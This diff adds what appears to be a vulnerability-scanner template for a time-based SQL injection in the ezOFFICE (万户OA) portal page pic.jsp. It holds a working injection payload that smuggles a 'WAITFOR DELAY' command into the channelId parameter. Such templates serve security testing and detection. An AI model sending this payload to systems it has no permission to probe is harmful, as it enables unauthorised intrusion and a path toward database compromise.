@@ -1,0 +1,12 @@
+name: 万户OA-ezOFFICE-pic-SQL注入
+description: >
+  SQL延时注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27;WAITFOR%20DELAY%20%270:0:5%27--"
+    expression:
+      sleep: 5
+      body_all:
+        - "defaultroot"
